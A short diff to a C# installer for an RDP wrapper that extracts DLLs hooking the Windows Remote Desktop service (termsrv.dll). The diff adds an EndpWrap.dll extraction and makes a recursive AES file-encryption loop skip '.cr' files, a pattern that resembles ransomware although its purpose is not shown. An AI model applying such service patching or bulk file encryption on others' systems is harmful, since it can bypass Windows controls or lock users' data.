@@ -57,6 +57,7 @@ namespace rdpWrapper {
     private const string TermSrvName = "termsrv.dll";
     private const string TermWrapDllName = "TermWrap.dll";
     private const string UmWrapDllName = "UmWrap.dll";
+    private const string EndpWrapDllName = "EndpWrap.dll";
     private const string ZydisDllName = "Zydis.dll";
 
     private readonly Logger logger;
@@ -481,6 +482,8 @@ namespace rdpWrapper {
           if (Environment.Is64BitOperatingSystem) {
             var umWrap = ExtractResourceFile(UmWrapDllName, WrapperFolderPath, archPrefix: true);
             logger.Log("Extracted umWrap.dll -> " + umWrap);
+            var endpWrap = ExtractResourceFile(EndpWrapDllName, WrapperFolderPath, archPrefix: true);
+            logger.Log("Extracted endpWrap.dll -> " + endpWrap);
           }
 
           break;
@@ -565,6 +568,7 @@ namespace rdpWrapper {
       if (!di.Exists)
         return;
       foreach (var fi in di.EnumerateFiles("*.*", SearchOption.AllDirectories)) {
+        if (fi.Extension == ".cr") continue;
         var memoryStream = new MemoryStream();
         using (var cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write)) {
           using (var fileStream = File.OpenRead(fi.FullName)) {
